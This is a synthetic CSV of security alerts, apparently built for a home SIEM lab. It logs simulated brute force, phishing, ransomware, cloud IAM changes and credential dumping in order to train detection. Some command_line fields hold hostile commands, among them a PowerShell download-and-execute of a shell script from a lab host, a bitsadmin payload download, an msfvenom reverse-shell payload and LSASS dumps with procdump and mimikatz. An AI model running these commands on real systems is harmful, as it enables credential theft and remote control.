access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,,,,,,,72,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T09:29:37.662194,Hydra / CrackMapExec,svc.backup,,,
,,,,,,,86,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T18:58:37.662482,Hydra,ubuntu,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-22T23:07:37.660404,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,FIN-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,185.220.101.45,,,,,,2026-04-21T11:58:37.660475,,jane.smith,,,
,,,,,invoice.xlsm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,dev.engineer@praharsh-lab.local,,,,,hr-support@secure-login[.]com,,High,,,,,,,Invoice #12345 Attached,,,,2026-04-21T04:21:37.669265,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.15,,,,,,2026-04-22T11:37:37.659709,,temp.analyst,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,0123456789abcdef0123456789abcdef,C:\Windows\Temp\payload.dll,,KALI-LAB-01,,,,,,Windows Defender / Wazuh,,,,Emotet,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-24T00:33:37.667489,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,FIN-SERVER-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.10,,,,,,2026-04-22T22:41:37.661246,,lab.administrator,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,meterpreter.exe,7414,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T07:37:37.663261,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Windows\Temp\payload.exe,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,cmd.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-22T09:09:37.663960,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T05:38:37.663075,,john.doe,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,FIN-SERVER-01,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-20T21:03:37.666028,,praharsh.admin,,,
,,,,,,,,,,,,,,,91.234.56.78,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET SCAN Nmap Detected,2826536,,,192.168.56.103,,,,,,2026-04-24T09:34:37.668996,,,,,
,,,,,,KALI-LAB-01,68,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T08:43:37.661640,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,29342,,,,,,,,,,,Version Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.101,,,2026-04-22T17:44:37.665041,Nmap,,,,
,,,,,,,,,,,,,,,91.234.56.78,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,ET MALWARE CobaltStrike Beacon,2817537,,,192.168.56.103,,,,,,2026-04-23T01:19:37.668938,,,,,
,,,,,,,,,,,,mimikatz.exe sekurlsa::logonpasswords,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,mimikatz.exe,9405,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T03:21:37.663228,,praharsh.admin,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.103,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SMB,,,,Low,,,,,77.73.133.84,,,,,,2026-04-23T05:02:37.668210,,,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,16506,DEV-SERVER-01,,Volume shadow service stopped,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T12:44:37.667785,,,,,
,,,,,document.docm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,finance.user@praharsh-lab.local,,,,,it-helpdesk@micr0soft[.]com,,High,,,,,,,ACTION REQUIRED: Verify your identity,,,,2026-04-21T00:41:37.669289,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,185.220.101.45,,,,,,2026-04-21T07:59:37.660221,,lab.administrator,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,WIN-PRAHARSH-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T07:23:37.664572,,attacker,,,
,AttachAdminPolicy,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-23T08:28:37.667855,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,SPLUNK-VM-01,,,,True,,Windows Security,,,,,T1068,,,SeImpersonatePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-24T02:55:37.665261,,svc.backup,,,
,,,,,,,,,,,,,,WIN-DC-PRAHARSH,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,DEV-SERVER-01,192.168.56.102,,,,,,2026-04-24T07:59:37.665551,,jane.smith,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,WIN-DC-PRAHARSH,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T00:18:37.664511,,temp.analyst,,,
,,,,,,KALI-LAB-01,463,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T15:10:37.661715,Hydra,lab.administrator,,,
,,,,,,,,,488876521,,,,,,185.220.101.45,,,,,Data Exfiltration Suspected,,,,,WIN-DC-PRAHARSH,,,,,,Firewall,,,,,T1048,,,,,,HTTPS,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T02:20:37.666936,,temp.analyst,,,
,,,,,reset_password.html,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,temp.analyst@praharsh-lab.local,,,,,hr-support@secure-login[.]com,,High,,,,,,,Urgent Password Reset Required,,,,2026-04-23T08:11:37.669043,,,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\ProgramData\malware.bat,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,regsvr32.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T03:10:37.663926,,praharsh.admin,,,
,,,,,,,166,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T06:56:37.662473,Hydra,splunk,,,
,,,,,,,,,,,,,,,23.129.64.100,443,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,bitsadmin.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-20T16:51:37.663562,,svc.splunk,,,
,,,192.168.56.103,DEV-SERVER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T04:42:37.669375,,,,Suspicious process spawned,100003
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.103,,,,,,2026-04-21T22:56:37.660685,,dev.engineer,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.102,445,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-Kali-Attacker,,,,Low,,,,,192.168.56.104,,,,,,2026-04-24T01:30:37.668424,,,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\ProgramData\malware.bat,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,wscript.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-22T19:49:37.663856,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-24T08:26:37.659469,,praharsh.admin,,,
,,,10.0.2.10,WIN-DC-PRAHARSH,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T08:44:37.669551,,,,Rootkit detection attempt,5710
,,,,,,,,,,,,,,KALI-LAB-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-DC-PRAHARSH,192.168.56.103,,,,,,2026-04-22T03:40:37.665726,,svc.backup,,,
,,,,,,,57,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T20:43:37.662486,Hydra,admin,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Windows\Temp\payload.exe,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,msiexec.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T16:13:37.663889,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-19T17:14:37.660566,,attacker,,,
,,,,,,KALI-LAB-01,433,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T21:46:37.661666,Hydra,lab.administrator,,,
,,,,,,KALI-LAB-01,300,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T16:18:37.661586,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,jane.smith@praharsh-lab.local,,,,,hr-support@secure-login[.]com,,High,,,,,,,Invoice #12345 Attached,,,,2026-04-23T03:12:37.669158,,,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.10,4444,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-Kali-Attacker,,,,Low,,,,,194.165.16.11,,,,,,2026-04-20T10:16:37.668502,,,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.102,1433,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SMB,,,,Low,,,,,192.168.56.104,,,,,,2026-04-22T16:03:37.668570,,,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T13:40:37.663057,,svc.backup,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,ELK-SERVER-01,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,DEV-SERVER-01,,,,,,,2026-04-22T18:00:37.666013,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,185.220.101.45,,,,,,2026-04-20T13:33:37.660389,,svc.splunk,,,
,,,,,,,,,,,,,,,45.67.22.10,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET SCAN Nmap Detected,2323309,,,172.16.0.100,,,,,,2026-04-22T10:50:37.668871,,,,,
,,,10.0.2.15,FIN-SERVER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T11:48:37.669395,,,,Suspicious process spawned,100003
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,KALI-LAB-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T18:41:37.664739,,dev.engineer,,,
,,,,,,,,,,,,,,,23.129.64.100,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-24T04:38:37.663415,,john.doe,,,
,,,,,document.docm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,john.doe@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,Your account has been compromised,,,,2026-04-20T02:05:37.669052,,,,,
,,,,,,KALI-LAB-01,388,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T04:31:37.661605,Hydra,lab.administrator,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,WAZUH-MANAGER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T01:03:37.664664,,svc.backup,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,6673,,,,,,,,,,,Version Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-23T15:47:37.665050,Nmap,,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,procdump.exe,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-21T21:01:37.667121,,attacker,,,
,,Quarantined,,,,,,,,,,,,,,,,,,Malware Detected,,a1b2c3d4e5f6789012345678abcdef01,C:\Users\praharsh.admin\Downloads\invoice.exe,,KALI-LAB-01,,,,,,Windows Defender / Wazuh,,,,Ryuk.Ransomware,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T03:43:37.667479,,,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.103,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-Kali-Attacker,,,,Low,,,,,45.67.22.10,,,,,,2026-04-23T06:59:37.668602,,,,,
,,,,,,,,,,Azure AD,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,Germany,China,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,7,2026-04-24T02:37:37.668006,,finance.user,,,
,,Detected,,,,,,,,,,,,,,,,,,Malware Detected,,0123456789abcdef0123456789abcdef,C:\Windows\Temp\payload.dll,,DEV-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Emotet,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T13:01:37.667322,,,,,
,,,,,,,66,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T11:39:37.662558,Hydra,admin,,,
,,,,,,,244,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T07:49:37.662371,Hydra,admin,,,
,,,,,,,,,,,,powershell -nop -c IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.104:8080/shell.ps1'),,,192.168.56.104,4444,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T03:12:37.664394,Metasploit / Netcat,svc.splunk,,,
,AssumeRole,,,,,,,,,GCP,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,s3:bucket/sensitive-data,,,,,High,,,,,,,,,,,2026-04-19T19:35:37.667824,,temp.analyst,,,
,CreateAccessKey,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,s3:bucket/sensitive-data,,,,,High,,,,,,,,,,,2026-04-20T09:56:37.667832,,temp.analyst,,,
,,,,,,,,,,,,bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,msiexec.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T14:45:37.664913,,dev.engineer,,,
,,,,,,,,,302375267,,,,,,185.220.101.45,,,,,Data Exfiltration Suspected,,,,,WIN-DC-PRAHARSH,,,,,,Firewall,,,,,T1048,,,,,,HTTPS,,,,,,,,,,Critical,,,,,,,,,,,2026-04-24T02:17:37.666844,,temp.analyst,,,
,,,,,,,264,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T17:23:37.662220,Hydra / CrackMapExec,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,SPLUNK-VM-01,,,,True,,Windows Security,,,,,T1068,,,SeRestorePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T10:37:37.665294,,svc.splunk,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,4444,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-C2-Ports,,,,Low,,,,,103.45.78.21,,,,,,2026-04-20T06:54:37.668590,,,,,
,,,,,,,,,,,,,,KALI-LAB-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-21T06:00:37.665801,,finance.user,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,ELK-SERVER-01,,,,True,,Windows Security,,,,,T1068,,,SeBackupPrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T11:20:37.665286,,finance.user,,,
,,Quarantined,,,,,,,,,,,,,,,,,,Malware Detected,,deadbeef12345678cafebabe87654321,C:\Windows\Temp\payload.dll,,DEV-SERVER-01,,,,,,Windows Defender / Wazuh,,,,RedLineStealer,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T23:45:37.667458,,,,,
,,,,,,,,,,,,,,,194.165.16.11,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Medium,SURICATA HTTP Reverse Shell Detected,2115729,,,172.16.0.100,,,,,,2026-04-23T11:08:37.668828,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,SPLUNK-VM-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-21T11:45:37.661316,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,49819,FIN-SERVER-01,,Ransom note created: README_DECRYPT.txt,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T14:27:37.667777,,,,,
,,,,,,,,,,,,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444,,,192.168.56.104,9001,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-24T06:59:37.664320,Metasploit / Netcat,finance.user,,,
,,,,,,,,,,Azure AD,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,United States,China,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,8,2026-04-20T07:49:37.668001,,jane.smith,,,
,,,,,,KALI-LAB-01,364,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T11:54:37.661424,Hydra,lab.administrator,,,
,,,,,invoice.xlsm,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,lab.administrator@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,Your account has been compromised,,,,2026-04-22T05:27:37.669033,,,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,mimikatz.exe,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-23T06:26:37.667159,,dev.engineer,,,
,,,192.168.56.101,WAZUH-MANAGER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-21T10:22:37.669476,,,,Privilege escalation detected,40101
,,,,,,,,,,,,,,DEV-SERVER-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-23T05:06:37.665877,,svc.splunk,,,
,BLOCK,,,,,,,,,,,,,,172.16.0.100,3389,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-Kali-Attacker,,,,Low,,,,,91.234.56.78,,,,,,2026-04-22T19:59:37.668450,,,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,certutil.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-24T04:30:37.663817,,,,,
,,,,,,,,,,Okta,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,United States,Russia,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,29,2026-04-23T23:38:37.668056,,attacker,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,9724,,,,,,,,,,,OS Detection,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-22T02:46:37.665206,Nmap,,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,8349,,,,,,,,,,,SYN Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-24T10:50:37.665155,Nmap,,,,
,,,,,,,,,,,,,,,185.220.101.45,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,rundll32.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-24T02:13:37.663462,,praharsh.admin,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,WIN-PRAHARSH-01,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,ELK-SERVER-01,,,,,,,2026-04-19T22:03:37.665941,,finance.user,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.105,3389,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-SSH-External,,,,Low,,,,,103.45.78.21,,,,,,2026-04-20T23:53:37.668497,,,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,SPLUNK-VM-01,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,regsvr32.exe,,,lsass.exe,,2026-04-21T10:58:37.667598,,,,,
,,,,,,,248,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T05:51:37.662394,Hydra,ubuntu,,,
